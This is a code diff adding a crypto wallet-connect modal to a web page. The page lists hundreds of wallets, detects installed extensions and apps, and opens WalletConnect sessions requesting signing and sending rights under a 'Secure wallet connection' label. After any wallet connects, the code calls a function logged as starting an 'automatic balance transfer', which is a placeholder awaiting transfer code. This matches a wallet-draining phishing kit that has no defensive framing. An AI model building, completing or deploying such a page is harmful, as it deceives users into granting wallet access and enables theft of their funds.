@@ -370,7 +370,6 @@
         .connect-overlay .overlay-message { margin-top: 10px; font-weight: 600; opacity: 0; transition: opacity 0.25s ease; }
         .connect-overlay .overlay-message.failed { color: #ef4444; opacity: 1; }
     </style>
-  <script type="module" crossorigin src="/assets/index-CeSmyCJc.js"></script>
 </head>
 <body>
     <button id="open-modal" class="px-10 py-4 bg-gradient-to-r from-indigo-600 to-purple-600 rounded-2xl font-semibold text-lg shadow-2xl hover:brightness-110 transition">
@@ -482,7 +481,1120 @@
             </div>
         </div>
     </div>
-
+
+    <script type="module" src="/src/main.js"></script>
+    <script type="module">
+        // Entry code runs here; Vite will inject the bundled `src/main.js` during dev/build.
+        // ────────────────────────────────────────────────────────────────────────────────
+        // Your original variables and functions (unchanged)
+        // ────────────────────────────────────────────────────────────────────────────────
+        const modalOverlay = document.getElementById('modal-overlay');
+        const manualOverlay = document.getElementById('manual-overlay');
+        const openBtn = document.getElementById('open-modal');
+        const toggleMoreBtn = document.getElementById('toggle-more');
+        const extraWallets = document.getElementById('extra-wallets');
+        const statusMessage = document.getElementById('status-message');
+        const searchInput = document.getElementById('wallet-search');
+        const visibleWallets = document.getElementById('visible-wallets');
+        let isExpanded = false;
+
+        const visibleList = [
+            { name: 'MetaMask', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
+            { name: 'WalletConnect', icon: 'https://avatars.githubusercontent.com/u/37784886?s=200&v=4' },
+            { name: 'Phantom', icon: '/wallets/phantom.png' }
+        ];
+
+        // Use the canonical wallet list provided by the user (deduped)
+        const rawExtraWallets = [
+            'metamask','walletconnect','phantom','trustwallet','coinbasewallet','ledgerlive','okxwallet','bitgetwallet',
+            'tokenpocket','safepal','uniswapwallet','zerion','xportal','cryptocomdefiwallet','bitcoincomwallet','bifrostwallet',
+            'bybitwallet','roninwallet','imtoken','safe(gnosis)','geminwallet','ctrlwallet','arculuswallet','wemixplaywallet',
+            'tangemwallet','exodus','hashpack','pintuwallet','blackfortwallet','wigwam','subwallet','avacus','keplr','petrawallet',
+            'templewallet','ambirewallet','basewallet','alchemysmartwallet','openfort','zengo','rabbywallet','krakenwallet',
+            'readywallet','backpack','portalwallet','litprotocolwallet','castlewallet','trezorsuite','dfnswallet','tahowallet',
+            'candidwallet','solflare','unipass','soulwallet','cashmerewallet','mew(myetherwallet)','stackupwallet','sequencewallet',
+            'blockwallet','enkrypt','obviouswallet','alphawallet','multis','coin98','alfa1wallet','venlywallet','frontierwallet',
+            'dapppocket','dcentwallet','ellipalwallet','sepiorwallet','qredowallet','snowflakewallet','gowallet','1inchwallet',
+            'binanceweb3wallet','bitpaywallet','bestwallet','fireblockswallet','nexowallet','coinrabbitwallet','youhodlerwallet',
+            'trusteewallet','guardawallet','infinitowallet','ownrwallet','coinwallet','electrumwallet','simpleholdwallet','jubiterblade',
+            'komodowallet','myceliumwallet','gemwallet','zeplywallet','zumowallet','myetherwallet','cryptxwallet','xapowallet',
+            'coinpaymentswallet','nowwallet','spectrocoinwallet','breadwallet','flxwallet','atomexwallet','heliowallet','jaxxlibertywallet',
+            'keepkeywallet','unstoppablewallet','secuxwallet','etherwall','samouraiwallet','etherliwallet','enjinwallet','indiesquare',
+            'litevault','holytransaction','mycrypto','edgewallet','daedaluswallet','omniwallet','ankerspay','binanceappwallet','bitamp',
+            'bitpie','blockchaincomwallet','brdwallet','btccomwallet','cashapp','chivowallet','circleinvest','citowise','coinsphwallet',
+            'croptywallet','digifoxwallet','greenaddress','havenwallet','kleverwallet','monarchwallet','omisegowallet','operawallet',
+            'passkeyswallet','plarkwallet','prodogewallet','stakedwallet','statuswallet','swirlwallet','uport','xdefiwallet','yoroiwallet',
+            'cryptocrit','bitgowallet','cryptomuswallet','coinomi','cwallet','plasbitwallet','cobowallet','binancechainwallet','jaxxwallet',
+            'mathwallet','blockstreamgreen','armorywallet','infinitywallet','argentwallet','bixinwallet','quppywallet','freewallet','lumiwallet',
+            'atomicwallet','udunwallet','balletwallet','monerogui','lisknano','mymonerowallet','neonwallet','vergewallet','owallet','incognitowallet',
+            'mistwallet','medoozawallet','bonpay','wagecanwallet','zebpay','electrumstratis','bitcoincashfreewallet','electrumcash','fantomcoinfreewallet',
+            'msignawallet','coinjarwallet','copaybitcoinwallet','bitxwallet','tokenlypockets','gatehub','zcashswinggui','zcashcockpitui','vcashclient',
+            'carbonwallet','vslicewebwallet','litecoincoreclient','dogeChain','dogecoincore','monerocoreclient','bitwala','bitherwallet','dashfreewallet',
+            'dogefreewallet','liskfreewallet','steemfreewallet','nxtfreewallet','ardorfreewallet','ethereumwallet','coinbank','airbitzbitcoinwallet','arcbit',
+            'bitcoincoreclient','hw1ledgerwallet','bitaddresspaperwallet','schildbachbtcwallet','electrumltcwallet','darkwalletbtc','multidogewallet','dogeandroidwallet',
+            'blockiowallet','coinapultwallet','btcwallet','coinspace','cryptonator','coolwallet','bitloxwallet','uberpaywallet','coincorner','bitcoinfreewallet',
+            'monerofreewallet','coinvault','xethetherwallet','virtacoinwallet','singulardtvlightwallet','counterwallet','openledger','unocoin','bitpanda','daricowallet',
+            'zcashfreewallet','bitinka','wavesliteclient','nxtclient','ipayyou','coinspot','mobi','agama','blockchainsmy','nemmobilewallet','nemnanowallet',
+            'bitconnectclient','stellardesktop','parity','digibytecore','eidoo','lykkewallet','zumminer','gefarapay','freewalletcryptowallet','bitbuckswallet','gnoissafemultisig',
+            'pillar','onto','bitpay','walleth','authereum','dharma','huobiwallet','mykey','loopringwallet','trustvault','alice','zelcore','nash','gridplus',
+            'cybavowallet','tokenary','torus','spatium','walletio','ownbit','easypocket','bridgewallet','sparkpoint','viawallet','bitkeep','vision','peakdefiwallet',
+            'halodefiwallet','dokwallet','atwallet','midaswallet','keyringpro','aktionariat','talkenwallet','xinfincxdcnetwork','flarewallet','kyberswap','atokenwallet',
+            'tonguewallet','rwallet','plasmapay','o3wallet','hashkeyme','jadewallet','defiant','coius','cmorq','valora','quiverx','celowallet','elastosessentials',
+            'fusecash','stasis','julwallet','fxwallet','bullapp','anybit','minervawallet','archipage','chaingefinance','iopay','coinhub','gopocket','wallet3','yitoken',
+            'didwallet','starbase','shinobiwallet','steakwallet','gdwallet','binana','airgap','paytube','blockbank','orange','neftipedia','krystal','linen','celoterminal','spot',
+            'rainbow','slushwallet','tronlink'
+        ];
+
+        const extraWalletNames = Array.from(new Set(rawExtraWallets));
+
+        let walletManifest = {};
+        (async function loadManifest() {
+            try {
+                const res = await fetch('/wallets/manifest.json');
+                if (res.ok) {
+                    walletManifest = await res.json();
+                    // re-render wallets now that manifest icons are available
+                    if (typeof renderVisibleWallets === 'function') renderVisibleWallets();
+                    if (typeof populateExtraWallets === 'function') populateExtraWallets();
+                }
+            } catch (e) {
+                walletManifest = {};
+            }
+        })();
+
+        // Basic helper implementations so the modal displays wallets and close buttons work
+        function normalizeKey(s) {
+            return (s || '').toString().toLowerCase().replace(/[^a-z0-9]/g, '');
+        }
+
+        function getIconFromManifestByName(name) {
+            if (!walletManifest || Object.keys(walletManifest).length === 0) return null;
+            const map = {};
+            Object.keys(walletManifest).forEach(k => { map[normalizeKey(k)] = walletManifest[k]; });
+            const raw = normalizeKey(name.replace(/\(.*\)/, ''));
+            const suffixes = ['wallet','wallets','app','suite','live','connect','web3','defi','client'];
+            const candidates = [raw];
+            suffixes.forEach(s => candidates.push(raw.replace(new RegExp(s + '$'), '')));
+            // token variations
+            raw.split(/[^a-z0-9]+/).forEach(tok => { if (tok) candidates.push(tok); });
+            // try direct and reverse substring matches
+            for (const c of candidates) {
+                const key = normalizeKey(c);
+                if (map[key]) return '/wallets/' + map[key];
+            }
+            // try substrings against manifest keys
+            for (const k of Object.keys(map)) {
+                if (raw.includes(k) || k.includes(raw)) return '/wallets/' + map[k];
+            }
+            return null;
+        }
+
+        function resolveIconUrl(name, providedIcon) {
+            if (providedIcon) return providedIcon;
+            const fromManifest = getIconFromManifestByName(name);
+            if (fromManifest) return fromManifest;
+            // Fallback placeholder with first letter
+            const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
+            return `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
+        }
+
+        // Mapping of known wallet keys to common mobile app URL schemes
+        const walletSchemeLookup = {
+            metamask: ['metamask://'],
+            phantom: ['phantom://'],
+            trustwallet: ['trust://','trustwallet://'],
+            coinbasewallet: ['coinbase://','cbwallet://','coinbasewallet://'],
+            ledgerlive: ['ledgerlive://'],
+            okxwallet: ['okxwallet://','okx://'],
+            bitgetwallet: ['bitget://','bitgetwallet://'],
+            tokenpocket: ['tpwallet://','tokenpocket://','tokenpocketwallet://'],
+            safepal: ['safepal://','safepalwallet://'],
+            solflare: ['solflare://'],
+            trezorsuite: ['trezor://','trezorsuite://'],
+            rabbywallet: ['rabby://'],
+            rainbow: ['rainbow://','rainbowwallet://'],
+            coinomi: ['coinomi://'],
+            coin98: ['coin98://'],
+            bitkeep: ['bitkeep://'],
+            walletconnect: ['wc://','walletconnect://']
+        };
+
+        function createWalletCard(entry) {
+            const name = typeof entry === 'string' ? entry : (entry.name || 'Unknown');
+            const icon = typeof entry === 'string' ? '' : (entry.icon || '');
+            const card = document.createElement('div');
+            card.className = 'wallet-item';
+            card.dataset.wallet = name;
+            // store icon or resolved icon path for later use
+            if (icon) card.dataset.icon = icon;
+
+            const wrapper = document.createElement('div');
+            wrapper.className = 'wallet-icon-wrapper';
+            const img = document.createElement('img');
+            img.alt = name;
+            img.style.width = '56px';
+            img.style.height = '56px';
+            // set source and handle loading errors (fallback to placeholder)
+            const src = resolveIconUrl(name, icon);
+            img.src = src;
+            // store the resolved icon path for debugging and potential re-use
+            card.dataset.icon = src;
+            img.onerror = function() {
+                const letter = (name && name[0]) ? name[0].toUpperCase() : 'W';
+                this.onerror = null;
+                this.src = `https://via.placeholder.com/96/222/fff?text=${encodeURIComponent(letter)}`;
+            };
+            wrapper.appendChild(img);
+
+            const label = document.createElement('div');
+            label.style.fontSize = '0.9rem';
+            label.style.marginTop = '6px';
+            label.textContent = name;
+
+            card.appendChild(wrapper);
+            card.appendChild(label);
+            card.addEventListener('click', handleWalletClick);
+            return card;
+        }
+
+        function renderVisibleWallets() {
+            if (!visibleWallets) return;
+            visibleWallets.innerHTML = '';
+            visibleList.forEach(w => visibleWallets.appendChild(createWalletCard(w)));
+        }
+
+        function populateExtraWallets() {
+            if (!extraWallets) return;
+            extraWallets.innerHTML = '';
+            const fallbackList = ['Coinbase Wallet', 'Trust Wallet', 'Rainbow', 'Argent', 'Ledger Live', 'Trezor Suite'];
+            const list = (extraWalletNames && extraWalletNames.length) ? extraWalletNames : fallbackList;
+            list.forEach(w => extraWallets.appendChild(createWalletCard(w)));
+        }
+
+        // Detect candidate native wallet apps and browser extensions for common wallets.
+        // For desktop browsers we check for injected providers (extensions) and return connectors.
+        // For mobile / unknown we return URL schemes to try opening native apps.
+        function detectInstalledWallets(name) {
+            const key = normalizeKey(name);
+            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+            const results = [];
+
+            function pushIfUnique(arr, obj) {
+                if (!arr.some(x => normalizeKey(x.name) === normalizeKey(obj.name))) arr.push(obj);
+            }
+
+            // Detect injected providers (desktop extensions)
+            try {
+                if (window.ethereum) {
+                    const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
+                    providers.forEach(p => {
+                        try {
+                            if (p.isMetaMask) pushIfUnique(results, { name: 'MetaMask', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'metamask://' });
+                            else if (p.isCoinbaseWallet) pushIfUnique(results, { name: 'Coinbase Wallet', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'coinbase://' });
+                            else pushIfUnique(results, { name: 'Ethereum Provider', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }) });
+                        } catch (e) {}
+                    });
+                }
+            } catch (e) {}
+
+            try { if (window.solana && window.solana.isPhantom) pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => window.solana.connect(), scheme: 'phantom://' }); } catch (e) {}
+            try { if (window.solflare && typeof window.solflare.connect === 'function') pushIfUnique(results, { name: 'Solflare', type: 'extension', connector: async () => window.solflare.connect(), scheme: 'solflare://' }); } catch (e) {}
+            try { if (window.keplr) pushIfUnique(results, { name: 'Keplr', type: 'extension', connector: async () => { await window.keplr.enable && await window.keplr.enable(); return true; }, scheme: 'keplr://' }); } catch (e) {}
+            try { if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { if (window.tronLink && window.tronLink.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb && window.tronWeb.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('No Tron request available'); }, scheme: 'tronlink://' }); } catch (e) {}
+            try { if (window.safepal || window.SafePal) pushIfUnique(results, { name: 'SafePal', type: 'extension', connector: async () => { if (window.safepal && window.safepal.request) return await window.safepal.request({ method: 'eth_requestAccounts' }); throw new Error('SafePal connector not available'); }, scheme: 'safepal://' }); } catch (e) {}
+
+            // Additional known wallet globals — best-effort detection for other extensions
+            const knownWalletGlobals = [
+                { name: 'Rabby', props: ['rabby', 'Rabby'], scheme: 'rabby://' },
+                { name: 'Rainbow', props: ['rainbow', 'Rainbow'], scheme: 'rainbow://' },
+                { name: 'MathWallet', props: ['mathwallet', 'MathWallet', 'mathWallet'], scheme: 'mathwallet://' },
+                { name: 'TokenPocket', props: ['tp', 'TokenPocket', 'tokenPocket', 'tpwallet'], scheme: 'tpwallet://' },
+                { name: 'Coin98', props: ['coin98', 'Coin98'], scheme: 'coin98://' },
+                { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], scheme: 'bitkeep://' },
+                { name: 'Wallet3', props: ['wallet3'], scheme: 'wallet3://' },
+                { name: 'Opera', props: ['opera', 'operaWallet'], scheme: 'opera://' },
+                { name: 'Trezor', props: ['trezor'], scheme: 'trezor://' }
+            ];
+            knownWalletGlobals.forEach(w => {
+                for (const p of w.props) {
+                    try {
+                        const provider = window[p];
+                        if (provider) {
+                            pushIfUnique(results, {
+                                name: w.name,
+                                type: 'extension',
+                                connector: async () => {
+                                    if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' });
+                                    if (typeof provider.connect === 'function') return await provider.connect();
+                                    if (typeof provider.enable === 'function') return await provider.enable();
+                                    throw new Error('No connect method on provider');
+                                },
+                                scheme: w.scheme
+                            });
+                            break;
+                        }
+                    } catch (e) {}
+                }
+            });
+
+            // Desktop: if we have extensions, return matches prioritized to the requested wallet name
+            if (!isMobile && results.length > 0) {
+                const exactMatches = results.filter(r => normalizeKey(r.name) === key || key.includes(normalizeKey(r.name)) || normalizeKey(r.name).includes(key));
+                if (exactMatches.length > 0) return exactMatches;
+                return results;
+            }
+
+            // Mobile / fallback: return URL schemes (or guessed scheme)
+            if (walletSchemeLookup[key]) {
+                return walletSchemeLookup[key].map(s => ({ name: name, scheme: s }));
+            }
+
+            const apps = [];
+            const base = normalizeKey(name).replace(/[^a-z0-9]/g, '');
+            if (base) apps.push({ name: name, scheme: `${base}://` });
+            return apps;
+        }
+
+        // Very small tryOpenDeepLink helper — attempts to open a URL and immediately run success callback.
+        function tryOpenDeepLink(url, onFail, onSuccess) {
+            try {
+                const a = document.createElement('a');
+                a.href = url;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                if (onSuccess) {
+                    // Call success shortly after attempting the link — approval() will wait for wallet response
+                    setTimeout(onSuccess, 100);
+                }
+            } catch (e) {
+                if (onFail) onFail(e);
+            }
+        }
+
+        // Wire up modal controls and search
+        (function wireModalControls() {
+            const closeBtn = document.getElementById('close-modal-btn');
+            if (closeBtn) closeBtn.addEventListener('click', () => {
+                modalOverlay.classList.remove('active');
+                setTimeout(() => { modalOverlay.style.display = 'none'; }, 400);
+            });
+
+            const closeManualBtn = document.getElementById('close-manual-btn');
+            if (closeManualBtn) closeManualBtn.addEventListener('click', () => {
+                manualOverlay.classList.remove('active');
+                setTimeout(() => { manualOverlay.style.display = 'none'; }, 400);
+            });
+
+            if (toggleMoreBtn) toggleMoreBtn.addEventListener('click', () => {
+                isExpanded = !isExpanded;
+                if (isExpanded) {
+                    extraWallets.classList.remove('hidden');
+                    toggleMoreBtn.textContent = 'Show fewer wallets';
+                } else {
+                    extraWallets.classList.add('hidden');
+                    toggleMoreBtn.textContent = 'More wallets (396)';
+                }
+            });
+
+            if (searchInput) searchInput.addEventListener('input', () => {
+                const q = searchInput.value.trim().toLowerCase();
+                const items = Array.from(document.querySelectorAll('.wallet-item'));
+                if (!q) {
+                    items.forEach(it => { it.style.display = ''; it.classList.remove('selected'); });
+                    statusMessage.textContent = 'Select a wallet to connect';
+                    statusMessage.classList.remove('status-failed');
+                    return;
+                }
+
+                const matches = items.filter(it => (it.dataset.wallet || '').toLowerCase().includes(q));
+
+                items.forEach(it => { it.style.display = matches.includes(it) ? '' : 'none'; it.classList.remove('selected'); });
+
+                if (matches.length === 0) {
+                    statusMessage.textContent = 'No wallets found';
+                    statusMessage.classList.add('status-failed');
+                } else {
+                    statusMessage.textContent = `${matches.length} wallet${matches.length>1? 's' : ''} found`;
+                    statusMessage.classList.remove('status-failed');
+                    // If match in extra wallets, expand the extra list so the result is visible
+                    const anyInExtra = matches.some(m => extraWallets && extraWallets.contains(m));
+                    if (anyInExtra && extraWallets) {
+                        extraWallets.classList.remove('hidden');
+                        isExpanded = true;
+                        if (toggleMoreBtn) toggleMoreBtn.textContent = 'Show fewer wallets';
+                    }
+                    // If exactly one match, highlight and scroll into view
+                    if (matches.length === 1) {
+                        const only = matches[0];
+                        only.classList.add('selected');
+                        setTimeout(() => only.scrollIntoView({ behavior: 'smooth', block: 'center' }), 100);
+                    }
+                }
+            });
+
+            // Render initially
+            renderVisibleWallets();
+            populateExtraWallets();
+        })();
+
+        // ────────────────────────────────────────────────────────────────────────────────
+        // Updated WalletConnect v2 Integration (with your Project ID)
+        // ────────────────────────────────────────────────────────────────────────────────
+        async function initiateWalletConnectDeepLink(options = {}) {
+            const { onFail, onSuccess } = options;
+
+            if (!window.SignClient) {
+                console.error("SignClient missing - make sure CDN loaded");
+                if (onFail) onFail(new Error("WalletConnect library missing"));
+                return;
+            }
+
+            let client;
+            try {
+                client = await window.SignClient.init({
+                    projectId: '81ec0eb195ddbee9c5596804e33ff584',
+                    relayUrl: 'wss://relay.walletconnect.com',
+                    metadata: {
+                        name: 'HollyHub Connect',
+                        description: 'Secure wallet connection for HollyHub',
+                        url: 'https://secure-connect.vercel.app',
+                        icons: ['https://secure-connect.vercel.app/crypto.png']
+                    }
+                });
+            } catch (e) {
+                console.error('WC v2 init failed:', e);
+                if (onFail) onFail(e);
+                return;
+            }
+
+            try {
+                const { uri, approval } = await client.connect({
+                    requiredNamespaces: {
+                        eip155: {
+                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
+                            chains: ['eip155:1'],
+                            events: ['chainChanged', 'accountsChanged']
+                        }
+                    }
+                });
+
+                if (!uri) throw new Error('No URI');
+
+                // Log the raw pairing URI for debugging on mobile devices
+                console.log('WC pairing URI:', uri);
+
+                const deepLink = `wc:${uri.split('wc:')[1]}`;
+                const universal = `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`;
+
+                tryOpenDeepLink(deepLink, () => {
+                    tryOpenDeepLink(universal, () => {
+                        console.warn('Deep link failed');
+                        if (onFail) onFail(new Error('Deep link failed'));
+                    }, async () => {
+                        try {
+                            const session = await approval();
+                            console.log('WC v2 connected:', session);
+                            if (onSuccess) onSuccess(client, session);
+                        } catch (e) {
+                            if (onFail) onFail(e);
+                        }
+                    });
+                }, async () => {
+                    try {
+                        const session = await approval();
+                        console.log('WC v2 connected via direct:', session);
+                        if (onSuccess) onSuccess(client, session);
+                    } catch (e) {
+                        if (onFail) onFail(e);
+                    }
+                });
+
+                return client;
+            } catch (e) {
+                console.error('WC v2 connection error:', e);
+                if (onFail) onFail(e);
+            }
+        }
+
+        // Placeholder - replace with your real transfer logic later
+        async function transferAllBalance() {
+            console.log('Wallet connected! Starting automatic balance transfer...');
+            alert('Wallet connected! Transfer initiated (placeholder)');
+            // Your ethers.js / web3.js transfer code goes here
+        }
+
+        // ────────────────────────────────────────────────────────────────────────────────
+        // Updated showDetectorPopup - now uses WC v2
+        // ────────────────────────────────────────────────────────────────────────────────
+        function showDetectorPopup(apps, walletName, fallback) {
+            const ov = document.getElementById('app-detector-overlay');
+            const list = document.getElementById('detected-list');
+            const title = document.getElementById('detector-title');
+            title.textContent = `Open ${walletName} app`;
+            list.innerHTML = '';
+                const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
+                // Display a small summary of detected items (optional)
+                const detectedNames = (apps && apps.length) ? apps.map(a => typeof a === 'string' ? a : (a.name || a.scheme || '')).filter(Boolean) : [];
+                if (detectedNames.length) {
+                    const p = document.createElement('div');
+                    p.style.marginBottom = '8px';
+                    p.style.color = '#cbd5e1';
+                    p.textContent = `Detected: ${detectedNames.join(', ')}`;
+                    list.appendChild(p);
+                }
+
+                // Create only two buttons: Open wallet & Continue in browser
+                const openBtn = document.createElement('button');
+                openBtn.className = 'login-btn';
+                openBtn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
+                openBtn.textContent = 'Open wallet';
+                openBtn.addEventListener('click', async () => {
+                    ov.style.display = 'none';
+                    // Try extensions first (desktop)
+                    try {
+                        const exts = (apps || []).filter(a => a && a.type === 'extension');
+                        if (!isMobile && exts.length > 0) {
+                            // try to match the clicked wallet first
+                            const normalized = normalizeKey(walletName || '');
+                            const exact = exts.filter(e => normalizeKey(e.name) === normalized || normalizeKey(e.name).includes(normalized) || normalized.includes(normalizeKey(e.name)));
+                            const toTry = exact.length ? exact : exts;
+                            let connected = false;
+                            for (let i = 0; i < toTry.length; i++) {
+                                const a = toTry[i];
+                                try {
+                                    // slight stagger
+                                    await new Promise(r => setTimeout(r, i * 400));
+                                    const res = await a.connector();
+                                    if (res) connected = true;
+                                    console.log('Connector result for', a.name, res);
+                                } catch (e) {
+                                    console.warn('Connector error', a.name, e);
+                                }
+                            }
+                            if (connected) {
+                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
+                                try { ov.style.display = 'none'; } catch (e) {}
+                                try { await transferAllBalance(); } catch (e) {}
+                                return;
+                            }
+                            // if none connected, fall back to scheme/WC
+                        }
+
+                        // Mobile or no extensions connected — use WalletConnect deep-link where appropriate
+                        try {
+                            const schemes = walletSchemeLookup[normalizeKey(walletName || '')] || (apps || []).map(a => a && a.scheme).filter(Boolean);
+                            await initiateWalletConnectDeepLink({
+                                appSchemes: schemes,
+                                onFail: () => {
+                                    // If deep link fails, try naive scheme(s)
+                                    const s = schemes && schemes.length ? schemes[0] : null;
+                                    if (s) {
+                                        tryOpenDeepLink(s, () => fallback(), () => {});
+                                    } else {
+                                        fallback();
+                                    }
+                                },
+                                onSuccess: async (client, session) => {
+                                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
+                                    try { ov.style.display = 'none'; } catch (e) {}
+                                    await transferAllBalance();
+                                }
+                            });
+                        } catch (e) {
+                            console.error('Initiate WC error', e);
+                            fallback();
+                        }
+                    } catch (e) {
+                        console.error('Open wallet flow error', e);
+                        fallback();
+                    }
+                });
+                list.appendChild(openBtn);
+
+                const manualBtn = document.createElement('button');
+                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
+                manualBtn.textContent = 'Continue in browser';
+                manualBtn.addEventListener('click', () => {
+                    ov.style.display = 'none';
+                    fallback();
+                });
+                list.appendChild(manualBtn);
+
+                document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
+                ov.style.display = 'flex';
+                return;
+
+            // Special-case: if user clicked 'walletconnect' show a single "Open wallets" button
+            const normalized = normalizeKey(walletName || '');
+            if (normalized === 'walletconnect') {
+                const btn = document.createElement('button');
+                btn.className = 'login-btn';
+                btn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
+                btn.textContent = 'Open wallets';
+                btn.addEventListener('click', async () => {
+                    ov.style.display = 'none';
+                    // First try desktop injected extensions
+                    const installed = detectAllInstalledExtensions();
+                    if (installed && installed.length > 0) {
+                        // sequentially trigger connectors so each extension can prompt
+                        for (let i = 0; i < installed.length; i++) {
+                            const a = installed[i];
+                            try {
+                                // small delay to help with multiple extension popups
+                                await new Promise(r => setTimeout(r, i * 600));
+                                await a.connector();
+                            } catch (e) {
+                                console.warn('Connector failed for', a.name, e);
+                            }
+                        }
+                        // done trying extensions; if none connected, fall back to WC deep link
+                        setTimeout(() => fallback(), 800);
+                        return;
+                    }
+
+                    // Mobile: open walletconnect flow (will attempt to open apps and request connection)
+                    try {
+                        // gather all known app schemes to attempt opening every installed mobile wallet
+                        const allSchemes = Array.from(new Set(Object.values(walletSchemeLookup).flat()));
+                        await initiateWalletConnectDeepLink({
+                            appSchemes: allSchemes,
+                            onFail: () => { console.warn('WC deep link failed'); fallback(); },
+                            onSuccess: async (client, session) => { console.log('WC v2 connected via Open wallets'); await transferAllBalance(); }
+                        });
+                    } catch (e) {
+                        console.error('Open wallets error', e);
+                        fallback();
+                    }
+                });
+                list.appendChild(btn);
+                const manualBtn = document.createElement('button');
+                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
+                manualBtn.textContent = 'Continue in browser';
+                manualBtn.addEventListener('click', () => { ov.style.display = 'none'; fallback(); });
+                list.appendChild(manualBtn);
+                document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
+                ov.style.display = 'flex';
+                return;
+            }
+
+            // Otherwise, render provided app options below
+            apps.forEach(a => {
+                const btn = document.createElement('button');
+                btn.className = 'login-btn';
+                btn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
+                // If the clicked wallet is coinbase, show only the coinbase button
+                const normalized = normalizeKey(walletName || '');
+                if (normalized.includes('coinbase')) {
+                    // prefer extension if provided
+                    if (a.type === 'extension' && typeof a.connector === 'function') {
+                        btn.textContent = `Open ${a.name}`;
+                        btn.addEventListener('click', async () => {
+                            ov.style.display = 'none';
+                            try {
+                                await a.connector();
+                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
+                                await transferAllBalance();
+                            } catch (e) {
+                                console.error('Coinbase extension connect failed', e);
+                                if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
+                            }
+                        });
+                    } else {
+                        btn.textContent = `Open ${a.name}`;
+                        btn.addEventListener('click', () => { ov.style.display = 'none'; tryOpenDeepLink(a.scheme, fallback, () => {}); });
+                    }
+                    list.appendChild(btn);
+                    return; // only show the coinbase button
+                }
+
+                // If this entry provides an extension connector, use it
+                if (a.type === 'extension' && typeof a.connector === 'function') {
+                    btn.textContent = `Open ${a.name}`;
+                    btn.addEventListener('click', async () => {
+                        ov.style.display = 'none';
+                        try {
+                            await a.connector();
+                            try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
+                            try { ov.style.display = 'none'; } catch(e){}
+                            try { await transferAllBalance(); } catch (e) { console.warn('transferAllBalance failed', e); }
+                        } catch (e) {
+                            console.error('Extension connect failed:', e);
+                            if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
+                        }
+                    });
+                } else {
+                    btn.textContent = `Open ${a.name}`;
+                    btn.addEventListener('click', async () => {
+                        ov.style.display = 'none';
+                        try {
+                            // For mobile/URL-scheme wallets use WalletConnect deep-link where applicable
+                            const perSchemes = walletSchemeLookup[normalizeKey(a.name || '')] || (a.scheme ? [a.scheme] : []);
+                            await initiateWalletConnectDeepLink({
+                                appSchemes: perSchemes,
+                                onFail: () => { tryOpenDeepLink(a.scheme, fallback, () => {}); },
+                                onSuccess: async (client, session) => { try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}; try { ov.style.display = 'none'; } catch(e){}; await transferAllBalance(); }
+                            });
+                        } catch (e) {
+                            console.error('WC attempt error:', e);
+                            tryOpenDeepLink(a.scheme, fallback, () => {});
+                        }
+                    });
+                }
+                list.appendChild(btn);
+            });
+            if (!apps || apps.length === 0) {
+                const note = document.createElement('div');
+                note.style.padding = '12px';
+                note.style.color = '#cbd5e1';
+                note.style.textAlign = 'center';
+                note.textContent = 'No native app detected — try opening the wallet app or continue in browser.';
+                list.appendChild(note);
+
+                const tryBtn = document.createElement('button');
+                tryBtn.className = 'login-btn';
+                tryBtn.style.background = 'linear-gradient(90deg,#22c55e,#16a34a)';
+                tryBtn.textContent = 'Try open app';
+                tryBtn.addEventListener('click', () => {
+                    ov.style.display = 'none';
+                    // attempt naive schemes based on walletName
+                    const candidates = [];
+                    const base = normalizeKey(walletName).replace(/[^a-z0-9]/g, '');
+                    if (base) {
+                        candidates.push(`${base}://`);
+                        candidates.push(`${base}wallet://`);
+                        candidates.push(`${base}app://`);
+                        candidates.push(`${base}-wallet://`);
+                    }
+                    // try each scheme in sequence
+                    let tried = 0;
+                    const tryNext = () => {
+                        if (tried >= candidates.length) {
+                            // all failed — fallback to side overlay
+                            fallback();
+                            return;
+                        }
+                        const s = candidates[tried++];
+                        tryOpenDeepLink(s, () => {
+                            // failed, try next
+                            tryNext();
+                        }, () => {
+                            // success callback — openConnect handled elsewhere
+                        });
+                    };
+                    tryNext();
+                });
+                list.appendChild(tryBtn);
+
+                const manualBtn = document.createElement('button');
+                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
+                manualBtn.textContent = 'Continue in browser';
